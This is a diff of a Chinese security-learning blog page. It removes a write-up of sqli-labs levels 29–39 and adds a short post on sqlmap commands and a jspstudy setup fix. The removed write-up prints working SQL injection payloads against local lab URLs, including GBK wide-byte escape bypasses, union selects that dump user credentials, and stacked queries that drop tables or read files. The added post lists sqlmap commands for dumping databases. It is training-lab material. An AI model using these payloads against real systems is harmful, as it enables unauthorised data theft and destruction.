@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="lesson29-39, 黛色若梦">
+    <meta name="keywords" content="sqlmap使用，kali的一些使用和jspstudy环境搭建, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>lesson29-39 | 黛色若梦</title>
+    <title>sqlmap使用，kali的一些使用和jspstudy环境搭建 | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">lesson29-39</h1>
+                    <h1 class="description center-align post-title">sqlmap使用，kali的一些使用和jspstudy环境搭建</h1>
                 </div>
             </div>
         </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-12-10
+                    2021-12-19
                 </div>
                 
 
@@ -469,74 +469,24 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="lesson29-39"><a href="#lesson29-39" class="headerlink" title="lesson29-39"></a>lesson29-39</h1><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>作者是个菜鸡，有不对的地方望请各路大佬见谅和指出。</p>
-<p>立个flag，这个月要把sqli靶场搞完，其实理应在十一月就搞完了。</p>
-<hr>
-<p>第二十九关–第三十一关</p>
-<p>注入点判断</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.127.1/sqli-labs-master/Less-29/?id=1&#39;">http://192.168.127.1/sqli-labs-master/Less-29/?id=1&#39;</a> and ‘1’=’1</p>
-<p>这题说是有waf,但是在尝试的时候并未显现任何过滤的内容，所以应该是有某些尝试错误的。</p>
-<p>查看源码，果然发现存在一个login.php文件，这个页面是有被waf的。然后这提示用到双重服务器，注意这里的第一层即我们之前搭建的是Apache的服务器，仅仅这样不然就与第一关没有区别了。所以找到本地文件中的PHP文件，发现存在login.jps文件，安装tomcat服务器，配置环境。</p>
-<p>再跳转到login.jps的页面进行sql注入。</p>
-<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
-<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
-<p>环境没搞出来，明天再搞，先做其他的。</p>
-<p>几天后：</p>
-<p><code>url</code>栏跑出来一个<code>hack.jsp</code>，可以看出来是<code>Tomcat</code>服务器，但是现在基本上没用<code>jsp</code>写后台的了，基本上用<code>php</code>，所以果断猜测是双服务器—<br>2.构造<code>http://localhost:8080/sqli-labs/Less-29/?id=1&amp;id=2</code>,然后绕过类型是单引号，然后接下来就是union注入的常用方法了。</p>
-<p><img src="/images/29%EF%BC%8810%EF%BC%89.png" alt="29（10）"></p>
-<p>33关–37关</p>
-<h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>第32关</p>
-<p>我们看到这个转义的16进制是5c，如果能够吞掉这个5c，就能够解决这个转义问题</p>
-<ul>
-<li>如何吞掉</li>
-<li>比如一个汉字：運，他的16进制编码就是df5c，正好有个5c。当然汉字 猏，aa5c也可以。</li>
-<li>输入：<code>http://127.0.0.1/sqli/Less-32/?id=1%df&#39;</code>报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘<code>&#39;1�\\&#39;&#39; LIMIT 0,1</code>’ at line 1，说明这个是用单引号括起来的字符型漏洞。然后我们就可以利用这个漏洞进行操作了</li>
-<li><code>http://127.0.0.1/sqli/Less-32/?id=1%df&#39; and 1=2 union select 1,2,3 --+</code> 判断回显点</li>
-</ul>
-<p>参考资料：GBK的内容：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php</a></p>
-<p>mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ‘ 的时候，往往利用的思路是将 ‘ 转换为 &#39; （转换的函数可以自定义，也可以用PHP自带函数）。<br>因此我们在此想办法将 ‘ 前面添加的\除掉，一般有两种思路：<br>1.%df吃掉\具体的原因是urlencode(‘) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此时%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2.将&#39;中的\过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</p>
-<p>感觉题目在提示我们用16进制编码形式。</p>
-<p><img src="/images/%E7%94%A8gbk%E7%BC%96%E7%A0%81.png" alt="用gbk编码"></p>
-<p><img src="/images/image-20211211003157297.png" alt="image-20211211003157297"></p>
-<p>users的十六进制编码:0x7573657273</p>
-<p>宽字节注入</p>
-<p>?id=-1%df’ UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users–+</p>
-<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+</code></p>
-<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+ </code></p>
-<p> <code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 oder by 3--+ </code></p>
-<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=0%df%5c%27 union select 1,2,3--+ </code></p>
-<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,database(),3--+ </code></p>
-<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+ </code></p>
-<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+ </code></p>
-<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(username,password) from users),3--+</code></p>
-<p>33关<img src="/images/33.png" alt="33"></p>
-<p>34关 只是把注入点从id换成uname,方式从get换成post，还是单引号注入</p>
-<p><img src="/images/34.png" alt="34"></p>
-<p>35关 注入方式把其他的都试了试，发现都不行，所以为数字型，那么所有的转义就形同虚实啦。</p>
-<p>36关 和三十二题一模一样，是源码中实现功能的函数不同的区别</p>
-<p><img src="/images/36.png" alt="36"></p>
-<p>37关 post型，只是把34关中过滤函数改了，方法一样。</p>
-<p><img src="/images/37.png" alt="37"></p>
-<p><img src="/images/37%EF%BC%882%EF%BC%89.png" alt="37（2）"></p>
-<p>总结<br>过滤 ‘ \ 常用的三种方式是直接 replace，<br>addslashes(),mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以我们在编写代码的时候需要考虑的更加仔细。下面给出几种防御的方式<br>1、在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为gbk 即可。设置代码：Mysql_set_charset(‘gbk’,’$conn’）<br>2、使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞。</p>
-<p>38关</p>
-<p>注入方式：单引号注入</p>
-<p><img src="/images/38.png" alt="38"></p>
-<p><img src="/images/38%EF%BC%882%EF%BC%89.png" alt="38（2）"></p>
-<p><img src="/images/38%EF%BC%883%EF%BC%89.png" alt="38（3）"></p>
-<p>这题报错注入，联合注入都可以用。</p>
-<p>查看源码</p>
-<p>开始学了新的注入方式，堆叠注入</p>
-<p>进行增删改查等操作，但对于各个数据库（mysql，sqlserver，oracle）等，除oracle不允许外，其他操作可行性同样。</p>
-<p>他与union不同的是注入的前后语句不一定要类型一致。但是不好的一点是他没有判断是否的显示判断。</p>
-<p>select * from users where id=1;create table test like users;  //新建表</p>
-<p>select * from users where id=1;drop table test;  //删除表</p>
-<p>select * from users where id=1;select 1,2,3;   //查询数据</p>
-<p>select * from users where id=1;select load_file(‘c:/tmpupbbn.php’); //加载文件</p>
-<p>select * from users where id=1;insert into users(id,username,password) values (‘100’,’new’,’new’);   //修改文件</p>
-<p>39关</p>
-<p>注入方式是整型，其他与38无异。</p>
-<p><img src="/images/39.png" alt="39"></p>
+                <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="（1）sqlmap"><a href="#（1）sqlmap" class="headerlink" title="（1）sqlmap"></a>（1）sqlmap</h2><p>sqlmap是一个开源软件，用于检测和利用数据库漏洞，并提供将恶意代码注入其中的选项。  它是一种渗透测试工具，可自动检测和利用SQL注入漏洞，在终端中提供其用户界面。该软件在命令行运行，可供不同操作系统下载：Linux发行版，Windows和Mac OS操作系统。  除了映射和检测漏洞之外，该软件还可以访问数据库，编辑和删除数据，以及查看表格中的数据，例如用户，密码，备份，电话号码，电子邮件地址，信用卡和其他机密和敏感信息。 sqlmap完全支持多个DBMS，包括MySQL，Oracle，PostgreSQL，Microsoft SQL  Server，Microsoft Access，IBM DB2，SQLite，Firebird和SAP MaxDB。  </p>
+<p>​        并全面支持所有注入技术：布尔值，错误，堆栈，时间，联合。</p>
+<h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><p>sqlmap.py -u “注入地址”  –dbs  // 列举数据库</p>
+<p>sqlmap.py -u “注入地址”  –current–db  // 当前数据库</p>
+<p>sqlmap.py -u “注入地址”  –users  // 列数据库用户</p>
+<p>sqlmap.py -u “注入地址”  –current–user // 当前用户</p>
+<p>sqlmap.py -u “注入地址”  –tables -D “数据库”  // 列举数据库的表名</p>
+<p>sqlmap.py -u “注入地址” –columns -T “表名” -D “数据库”  // 获取表的列名</p>
+<p>sqlmap.py -u “注入地址” –dump -C “列名字” -T “表名字” -D “数据库”  //获取数据库下表的列信息</p>
+<h4 id="具体例子："><a href="#具体例子：" class="headerlink" title="具体例子："></a>具体例子：</h4><p>地址：<code>sqlmap -u &#39;192.168.3.59/article.php?id=1&#39;</code>，一定要加入<code>GET</code>参数，不然<code>sqlmap</code>不知道使用什么参数去注入</p>
+<p>这里显示一些指令，在kali里已经默认安装好了</p>
+<p>（2）<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42311391/article/details/89294900">kali的一些用法</a></p>
+<p>（3）jspstudy</p>
+<p>   这里是因为我在小皮面板上的mysql和在jspstudy上的矛盾了，选择的是jsp里面的，然后之前又把面板连接数据库的默认密码给改了，导致现在没有办法访问，显示访问java.io.IOException: java.net.ConnectException: Connection refused: connect失败。</p>
+<p>解决方法就是在把配置运行的那一版的数据库</p>
+<p><img src="/images/29%E9%85%8D%E7%BD%AE.png" alt="29配置"></p>
+<p>的密码改过来root.</p>
+<p>然后就显示正常了。<img src="/images/291.png" alt="291"></p>
 
                 
             </div>
@@ -563,7 +513,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/12/10/lesson29-39/">http://example.com/2021/12/10/lesson29-39/</a>
+                    <a href="http://example.com/2021/12/19/sqlmap%E4%BD%BF%E7%94%A8%EF%BC%8Ckali%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E5%92%8Cjspstudy%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">http://example.com/2021/12/19/sqlmap%E4%BD%BF%E7%94%A8%EF%BC%8Ckali%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E5%92%8Cjspstudy%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -778,13 +728,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2021/12/11/Lesson40-45/">
+                <a href="/2021/12/22/Upload-labs1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Lesson40-45">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Upload-labs1">
                         
-                        <span class="card-title">Lesson40-45</span>
+                        <span class="card-title">Upload-labs1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -795,8 +745,45 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-11
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-22
                         </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hzk
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/12/17/Lesson57-65/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Lesson57-65">
+                        
+                        <span class="card-title">Lesson57-65</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -812,43 +799,6 @@
                         <span class="chip bg-color">sqli靶场</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/12/03/lesson26-28/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="lesson26-28">
-                        
-                        <span class="card-title">lesson26-28</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-03
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            hzk
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
